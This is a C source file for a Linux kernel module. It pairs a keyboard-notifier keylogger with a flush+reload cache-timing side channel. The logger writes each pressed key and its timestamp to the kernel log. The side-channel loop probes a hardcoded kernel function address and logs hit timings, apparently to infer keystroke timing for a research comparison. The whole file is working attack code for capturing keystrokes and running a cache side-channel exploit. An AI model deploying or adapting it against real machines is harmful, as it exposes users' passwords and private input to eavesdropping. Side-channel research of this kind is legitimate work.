#include <linux/delay.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/kthread.h>
#include <linux/ktime.h>
#include <linux/module.h>
#include <linux/sched.h>

static struct notifier_block nb;
static u64 start_time = 0;

// cache hit threshold in nanoseconds, assuming cpu running at 2.5 to 3 GHz
#define HIT_THRESHOLD 50

// execution time of the flush+reload thread in seconds
#define EXEC_TIME 10

#define LINE_SIZE 64

#define FUNCTION_ADDRESS 0xffffffffa1f00fc0

void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }

void flush(void *p) { asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax"); }

u64 flush_reload(void *addr) {
  // Measure the start time
  u64 start_time = ktime_get_real_ns();
  maccess(addr);
  u64 elapsed_time = ktime_get_real_ns() - start_time;
  asm volatile("mfence \n\t");
  flush(addr);
  return elapsed_time;
}

/* Callback function to intercept keypresses */
static int keylogger_notify(struct notifier_block *nb, unsigned long action,
                            void *data) {
  struct keyboard_notifier_param *param =
      (struct keyboard_notifier_param *)data;

  if (action == KBD_KEYSYM && param->down) { // Check if a key is pressed
    printk(KERN_INFO "{\'key-char\': \'%c\', \'keystroke-time\': %llu}",
           param->value - 64353 + 'a', ktime_get_real_ns() - start_time);
  }

  return NOTIFY_OK;
}

static int keystroke_timing(void *data) {
  u64 thread_start = ktime_get_seconds();
  u64 current_time = thread_start;
  u64 last_hit_time = ktime_get_real_ns();
  while (current_time - thread_start < EXEC_TIME) {
    u64 time = flush_reload((void *)(FUNCTION_ADDRESS));
    if (time < HIT_THRESHOLD) {
      u64 current_time_ns = ktime_get_real_ns();
      printk(KERN_INFO "{\'last-hit\': %llu, \'keystroke-time\': %llu}",
             current_time_ns - last_hit_time - time,
             current_time_ns - start_time -
                 time); // subtract flush+reload time to make it a little more
                        // accurate
      last_hit_time = current_time_ns - time;
    }
    current_time = ktime_get_seconds();

    for (int i = 0; i < 1; i++) {
      schedule();
    }
  }
  return 0;
}

static int __init my_module_init(void) {
  nb.notifier_call = keylogger_notify;
  register_keyboard_notifier(&nb);
  start_time = ktime_get_real_ns();
  printk(KERN_INFO "flush+reload period starts: %llu", start_time);
  keystroke_timing(NULL);
  printk(KERN_INFO "flush+reload period ends");
  return 0; // Success
}

static void __exit my_module_exit(void) {
  unregister_keyboard_notifier(&nb);
  printk(KERN_INFO "flush+reload module unloaded");
}

module_init(my_module_init);
module_exit(my_module_exit);
MODULE_LICENSE("GPL");
